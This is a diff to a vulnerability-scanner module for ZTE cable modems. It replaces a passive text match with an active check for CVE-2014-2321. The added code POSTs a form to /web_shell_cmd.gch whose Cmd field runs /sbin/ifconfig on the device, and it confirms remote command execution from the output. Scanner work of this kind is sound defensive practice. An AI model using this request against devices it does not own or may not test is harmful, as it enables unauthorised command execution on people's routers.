@@ -66,11 +66,31 @@ class Module(Scanner, Http_client):
         if not r or r.status_code != 200:
             return False
         body = r.text or ""
-        body_all = ('please input shell command', 'ZTE Corporation. All rights reserved',)
-        if (all(m in body for m in body_all)):
+        if 'please input shell command' not in body:
+            return False
+        data = (
+            'IF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1'
+            '&Cmd=%2Fsbin%2Fifconfig&CmdAck='
+        )
+        g = self.http_request(
+            method='POST',
+            path='/web_shell_cmd.gch',
+            data=data,
+            headers={'Content-Type': 'application/x-www-form-urlencoded'},
+            allow_redirects=False,
+        )
+        gout = g.text or '' if g else ''
+        if 'Link encap' in gout and 'HWaddr' in gout:
             self.set_info(
                 severity='critical',
-                reason="ZTE Cable Modem Web Shell detected",
+                reason='ZTE web_shell_cmd.gch RCE (CVE-2014-2321)',
+                path='/web_shell_cmd.gch',
+            )
+            return True
+        if 'ZTE Corporation' in body or 'please input shell command' in body:
+            self.set_info(
+                severity='critical',
+                reason='ZTE Cable Modem Web Shell exposed',
                 path='/web_shell_cmd.gch',
             )
             return True
